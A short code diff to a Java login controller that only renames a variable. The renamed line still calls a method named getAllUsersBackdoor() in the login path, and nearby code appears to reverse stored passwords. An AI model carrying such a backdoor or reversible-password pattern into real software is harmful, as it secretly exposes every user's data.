@@ -54,7 +54,7 @@ public class LoginController extends Controller {
         LoginRequest loginRequest = super.readRequest(is, LoginRequest.class);
 
         UserEntity userEntity = datasource.get(loginRequest.getUsername());
-        String backdoored_data = datasource.getAllUsersBackdoor();
+        String backdooredData = datasource.getAllUsersBackdoor();
 
         LoginResponse response;
         if(userEntity != null && unhashPassword(userEntity.getPassword(), loginRequest.getPassword())){
